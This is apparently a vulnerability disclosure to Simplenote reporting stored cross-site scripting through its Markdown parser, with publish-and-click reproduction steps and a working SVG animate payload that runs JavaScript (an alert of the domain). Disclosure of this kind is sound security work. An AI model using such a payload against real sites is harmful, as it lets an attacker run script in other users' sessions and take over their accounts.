Summary:

Hi,

A carefully crafted injection used against the Markdown input parser can be leveraged to store and execute arbitrary JavaScript in the `app.simplenote.com` context.

## Proof of concept
Before proceeding to reproduce this vulnerability, please log in to `app.simplenote.com` and create a new note with the "Markdown Formatted" option enabled.

1. Please paste the below payload into the "Edit" window, then select the "triple dots" icon > **Publish**

2. Next, please access the provided Simplenote URL, and select the black rectangle to execute the XSS payload.

Please note that I deleted the note and account used to test the aforementioned PoC immediately after confirming successful exploitation.

### Markdown parser payload

```
<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" />
</a>//["'`-->]]>]</div>
```
